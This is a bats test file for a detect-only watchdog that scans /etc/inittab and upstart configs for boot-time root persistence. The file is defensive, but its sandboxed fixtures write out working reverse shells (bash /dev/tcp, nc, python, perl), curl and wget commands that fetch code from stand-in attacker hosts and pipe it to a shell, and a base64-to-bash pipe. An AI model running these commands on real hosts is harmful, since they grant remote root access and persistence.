#!/usr/bin/env bats
# L2 bats functional tests for the inittab-watchdog scan script.
#
# /etc/inittab `id:runlevels:action:process` lines run `process` AS ROOT at
# boot; with `respawn` init even restarts it if killed — a resilient
# persistence vector. Only the exec actions (respawn/once/wait/boot/
# bootwait/sysinit/powerwait/powerfail) carry a payload. Also scans upstart
# /etc/init/*.conf `exec` lines. A process under a writable root (or an
# injection pattern in the line) is alert.
#
# Runs the actual scan script with `logger` shadowed on PATH and the config
# in a tmp sandbox via SELFDEF_INITTAB_FILE / _UPSTART.
#
# Run with: bats packaging/test/L2-inittab-watchdog.bats

WD="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd/inittab-watchdog.sh"
LIB="${BATS_TEST_DIRNAME}/../lib/module-lib.sh"

setup() {
    TMP="$(mktemp -d)"
    BIN="${TMP}/bin"; mkdir -p "${BIN}"
    cat > "${BIN}/logger" <<'FAKELOGGER'
#!/usr/bin/env bash
printf '%s\n' "$*" >> "${SELFDEF_TEST_LOGCAP}"
FAKELOGGER
    chmod +x "${BIN}/logger"
    export SELFDEF_TEST_LOGCAP="${TMP}/log.out"
    : > "${SELFDEF_TEST_LOGCAP}"
    BASELINE="${TMP}/baseline.tsv"
    INITTAB="${TMP}/inittab"
    UPSTART="${TMP}/init"; mkdir -p "${UPSTART}"
}

teardown() { rm -rf "${TMP}"; }

run_wd() {
    PATH="${BIN}:${PATH}" \
    SELFDEF_MODULE_LIB="${LIB}" \
    SELFDEF_INITTAB_PROFILE="${PROFILE:-report}" \
    SELFDEF_INITTAB_BASELINE="${BASELINE}" \
    SELFDEF_INITTAB_FILE="${INITTAB_F:-$INITTAB}" \
    SELFDEF_INITTAB_UPSTART="${UPSTART_D:-$UPSTART}" \
    bash "${WD}"
}

cap() { cat "${SELFDEF_TEST_LOGCAP}"; }

# ============================================================
# ok tier
# ============================================================

@test "no inittab / upstart → ok / no_inittab" {
    INITTAB_F="${TMP}/nonexistent" UPSTART_D="${TMP}/nonexistent.d" run_wd
    cap | grep -q '"event":"no_inittab"'
    cap | grep -q '"severity":"ok"'
}

@test "benign inittab, first run → ok / baseline_initial" {
    printf 'id:5:initdefault:\nsi::sysinit:/etc/init.d/rcS\n1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    cap | grep -q '"event":"baseline_initial"'
    cap | grep -q '"severity":"ok"'
    [ -f "${BASELINE}" ]
}

@test "unchanged inittab on second run → ok / inittab_intact" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"inittab_intact"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# alert tier
# ============================================================

@test "a respawn process under a writable root → alert / inittab_suspicious" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd                                   # benign baseline
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"inittab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "a once action carrying a curl|sh injection → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:once:/bin/sh -c "curl http://evil|sh"\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "an upstart exec under a writable root → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf 'start on runlevel [2345]\nexec /dev/shm/job\n' > "${UPSTART}/evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

# ============================================================
# warn tier
# ============================================================

@test "a benign process change → warn / inittab_changed" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/agetty 38400 tty1\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"event":"inittab_changed"'
    cap | grep -q '"severity":"warn"'
}

# ============================================================
# false-positive guards
# ============================================================

@test "standard getty respawn + initdefault are NOT flagged" {
    printf 'id:5:initdefault:\nca:12345:ctrlaltdel:/sbin/shutdown -t1 -a -r now\n1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    ! cap | grep -q '"severity":"alert"'
    cap | grep -q '"severity":"ok"'
}

# ============================================================
# enforce profile
# ============================================================

@test "missing module-lib → alert / module_lib_missing + non-zero exit" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    LIB="${TMP}/nonexistent-module-lib.sh" run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"event":"module_lib_missing"'
    cap | grep -q '"severity":"alert"'
}

@test "enforce profile exits non-zero on a suspicious process" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf 'x1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    PROFILE=enforce run run_wd
    [ "${status}" -ne 0 ]
    cap | grep -q '"severity":"alert"'
}

@test "baseline is chmod 0600 (confidentiality — inittab inventory enumerates boot-time root-exec surface)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    [ "$(stat -c '%a' "${BASELINE}")" = "600" ]
}

@test "INVARIANT (reverse-shell pattern in respawn): /dev/tcp reverse shell → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (wget-pipe-sh in once): wget bootstrap → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nwg:5:once:wget -qO- http://attacker/p | sh\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (base64-decode-pipe in sysinit): obfuscation → alert" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nb64::sysinit:echo YmFzaCAtaQ== | base64 -d | bash\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (respawn under /var/tmp): writable-root expansion" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/var/tmp/.attacker-payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (upstart exec carries an injection pattern): upstart axis also covered" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf 'start on runlevel [2345]\nexec bash -i >& /dev/tcp/1.1.1.1/4444 0>&1\n' > "${UPSTART}/evil.conf"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (world-writable inittab file → alert)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    chmod 0666 "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "JSON record is emitted as a SINGLE main logger line (downstream JSON-line consumer contract)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-inittab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (no auto-trust): inittab-watchdog does NOT refresh baseline on suspicious-process detection — alert STAYS until operator updates" {
    # T1037 boot-time persistence — alert MUST persist across runs
    # until operator explicitly re-baselines.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nx1:5:respawn:/tmp/.payload\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # first delta — alert
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # alert STAYS
    cap | grep -q '"event":"inittab_suspicious"'
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (commented suspicious respawn NOT flagged: # prefix filtered)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n# x1:5:respawn:/tmp/.example-attacker\n' > "${INITTAB}"
    run_wd
    ! cap | grep -q '"event":"inittab_suspicious"'
    ! cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (bootwait + powerwait + powerfail actions all scanned — comprehensive exec-action coverage)" {
    # The watchdog scans ALL exec actions (not just respawn/once/sysinit).
    # Lock that bootwait/powerwait/powerfail are also covered.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nbw::bootwait:/tmp/.bootwait-attacker\n' > "${INITTAB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (curl-pipe-bash variant — bash subshell — also detected in respawn)" {
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:curl -s http://attacker.com/p | bash\n' > "${INITTAB}"
    run_wd
    cap | grep -q '"severity":"alert"'
}

@test "INVARIANT (nc reverse-shell variant in inittab respawn: netcat-listening pipe also detected — sister axis to /dev/tcp)" {
    # Sister to the brain-wide nc reverse-shell variant INVARIANT
    # family already locked. inittab respawn entries run AS ROOT
    # continuously at the named runlevel — a recurring persistence
    # vector (T1037 — Boot or Logon Initialization Scripts via SysV
    # init). The respawn action restarts the named program if it
    # exits, making the listener self-healing across attempts.
    # Locks the netcat axis on the inittab boot-time-respawn root-
    # exec persistence surface alongside the other variants.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\nrs:5:respawn:nc -e /bin/sh 1.1.1.1 4444\n' > "${INITTAB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (python -c reverse-shell variant — interpreter-rev-shell axis on inittab respawn surface)" {
    # Sister to many other watchdog's python interpreter-rev-shell
    # INVARIANTs across the brain. Beyond bash/sh/nc, attackers
    # reach for python -c 'import socket,os,pty' to dodge shell-
    # pattern detectors. Locks the python axis on the inittab
    # boot-time-respawn root-exec persistence surface (T1037 —
    # Boot or Logon Initialization Scripts via SysV init; respawn
    # action makes the listener self-healing across kill attempts).
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\npy:5:respawn:python -c "import socket,os,pty;s=socket.socket();s.connect((\\"1.1.1.1\\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);pty.spawn(\\"/bin/sh\\")"\n' > "${INITTAB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (perl -e reverse-shell variant — perl-interpreter-rev-shell axis on inittab respawn surface)" {
    # Sister to nc / python -c / curl|bash / dev-tcp inittab respawn
    # rev-shell variants already locked. Perl is on every Debian/
    # Ubuntu host as dpkg/locale dependency. Locks perl axis on
    # T1037 inittab boot-time-respawn root-exec persistence — the
    # respawn action makes the listener self-healing across kill
    # attempts.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\npl:5:respawn:perl -e "use Socket;\\$i=\\"1.1.1.1\\";\\$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\\"tcp\\"));connect(S,sockaddr_in(\\$p,inet_aton(\\$i)));exec(\\"/bin/sh -i\\");"\n' > "${INITTAB}"
    run_wd
    cap | grep -qE '"severity":"(alert|warn)"'
}

@test "INVARIANT (single MAIN logger record per scan — SDD-062 consumer dispatch contract)" {
    # Sister to brain-wide single-MAIN-logger-line INVARIANTs.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd
    : > "${SELFDEF_TEST_LOGCAP}"
    printf '1:2345:respawn:/sbin/getty 38400 tty1\na:5:respawn:/tmp/.evil1\nb:5:respawn:/var/tmp/.evil2\nc:5:respawn:/dev/shm/.evil3\n' > "${INITTAB}"
    run_wd
    main_count=$(cap | grep -cE '^-t selfdef-inittab -- ')
    [ "${main_count}" = "1" ]
}

@test "INVARIANT (baseline re-establish on operator out-of-band deletion: missing baseline re-creates cleanly + emits baseline_initial)" {
    # Sister to brain-wide baseline-re-establish INVARIANTs.
    # State-resilience on T1037 init-process surveillance.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    run_wd                                              # establishes baseline
    [ -f "${BASELINE}" ]
    rm -f "${BASELINE}"                                  # operator wipe
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # must re-establish
    [ -f "${BASELINE}" ]
    cap | grep -qE '"event":"baseline_initial"'
}

@test "INVARIANT (severity bounded vocabulary {ok,warn,alert} — operator dashboard parser contract on inittab surface)" {
    # Sister to brain-wide severity-bounded-vocabulary INVARIANTs.
    # The inittab-watchdog MUST only emit severity values from
    # the closed set {ok,warn,alert} — never custom values
    # (critical, error, fatal, notice, info). Operator dashboard
    # parsers branch on the literal severity string; an out-of-
    # set value silently falls through routing and the operator
    # never sees the T1037 init-process persistence alert.
    # Locks parser contract on the /etc/inittab respawn/
    # bootwait/powerwait detection surface.
    printf '1:2345:respawn:/sbin/getty 38400 tty1\n' > "${INITTAB}"
    : > "${SELFDEF_TEST_LOGCAP}"
    run_wd                                              # ok / baseline
    printf '1:2345:respawn:/sbin/getty 38400 tty1\na:5:respawn:/tmp/.evil\n' > "${INITTAB}"
    run_wd                                              # alert path
    bad=$(grep -oE '"severity":"[^"]+"' "${SELFDEF_TEST_LOGCAP}" | grep -vE '"severity":"(ok|warn|alert)"' || true)
    [ -z "${bad}" ]
}

@test "INVARIANT (service unit declares Type=oneshot — timer-driven probe semantics)" {
    # Sister to brain-wide systemd Type=oneshot INVARIANT family.
    # inittab-watchdog runs ON the timer's scheduled fire —
    # scans /etc/inittab respawn/bootwait/powerwait actions for
    # injection patterns, emits a verdict, then exits.
    # Type=simple would break timer OnUnitActiveSec semantics.
    # Locks oneshot-probe contract on the inittab-watchdog
    # substrate.
    svc="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd/selfdef-inittab.service"
    [ -f "${svc}" ]
    grep -qE '^Type=oneshot' "${svc}"
}

@test "INVARIANT (module.toml TOML-parseable — anti-malformed-manifest contract)" {
    # Sister to brain-wide module.toml TOML-parseable INVARIANT
    # family. inittab-watchdog manifest declares install +
    # profile gating the resolver enforces; malformed manifest
    # wedges the /etc/inittab respawn/exec scanner baseline.
    # Python's tomllib is the canonical parser. Locks anti-
    # malformed-manifest on the inittab-watchdog substrate.
    mtoml="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/module.toml"
    [ -f "${mtoml}" ]
    python3 -c "
import tomllib
with open('${mtoml}', 'rb') as fp:
    data = tomllib.load(fp)
assert data['name'] == 'inittab-watchdog', 'name mismatch'
assert 'version' in data, 'version missing'
assert 'install' in data, 'install missing'
"
}

@test "INVARIANT (no auto-fix: inittab-watchdog libexec NEVER writes back to its scanned target — surveillance not remediation)" {
    # Sister to brain-wide no-auto-{fix,delete,restore,uninstall}
    # family. inittab-watchdog is a DETECT-only watchdog: surveils its
    # target + emits verdicts, NEVER writes back. The libexec
    # script must NOT contain sed -i / tee mutations of its
    # scanned paths. Locks no-auto-fix on the inittab-watchdog
    # libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd"
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'sed[[:space:]]+-i.*\$\{?[A-Z_]*FILE'
        ! grep -vE '^[[:space:]]*#' "${sh}" | grep -qE 'tee[[:space:]].*\$\{?[A-Z_]*FILE'
    done
}

@test "INVARIANT (inittab-watchdog libexec uses set -u — anti-unbound-variable contract on the watchdog probe)" {
    # Sister to brain-wide shell-discipline INVARIANT family.
    # The inittab-watchdog libexec uses set -u to catch typo'd env-var
    # references before they silently propagate as empty
    # strings into baseline-path operations. Locks set -u
    # discipline on the inittab-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE '^set[[:space:]]+-u' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (inittab-watchdog libexec uses logger -t with selfdef- tag — SDD-062 syslog routing contract)" {
    # Sister to brain-wide SDD-062 logger-tag INVARIANT family.
    # Locks SDD-062 logger-tag routing discipline on the
    # inittab-watchdog libexec substrate.
    wd_libexec="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd"
    found=0
    for sh in "${wd_libexec}"/*.sh; do
        [ -f "${sh}" ] || continue
        if grep -qE 'logger[[:space:]]+-t[[:space:]]+selfdef-' "${sh}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}

@test "INVARIANT (inittab-watchdog timer unit declares RandomizedDelaySec — anti-thundering-herd cadence contract)" {
    # Sister to brain-wide timer-cadence INVARIANT family.
    # Locks anti-thundering-herd cadence discipline on the
    # inittab-watchdog timer substrate.
    timer="${BATS_TEST_DIRNAME}/../../modules/inittab-watchdog/systemd"
    found=0
    for t in "${timer}"/*.timer; do
        [ -f "${t}" ] || continue
        if grep -qE '^RandomizedDelaySec=' "${t}"; then
            found=1
        fi
    done
    [ "${found}" = "1" ]
}
